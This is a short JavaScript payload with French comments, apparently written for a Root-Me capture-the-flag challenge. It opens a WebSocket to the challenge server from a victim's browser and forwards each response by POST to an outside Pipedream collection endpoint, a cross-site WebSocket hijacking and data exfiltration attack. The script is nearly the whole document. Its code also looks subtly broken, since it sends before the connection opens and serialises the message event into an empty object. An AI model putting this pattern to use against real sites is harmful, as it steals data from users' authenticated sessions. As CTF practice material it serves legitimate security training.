//mon url pour recuperer les resultats

let endpoint = "https://eoa21cz1z5v9xqj.m.pipedream.net"

//on check si le navigateur supporte le websocket
if (!window.WebSocket) {
    console.log("socket not supported by this browser");
}

//je initialise mon socket en lui passant le endpoint
var connection = new WebSocket('ws://ctf27.root-me.org/ws');  

//on envoie un message au websocket
connection.send("hello");

//si le websocket envoie une reponse on la renvoie vers pipedream
connection.onmessage = (datas)=>{
    fetch(endpoint,{
        method:"POST",
        body:JSON.stringify(datas)
    })
}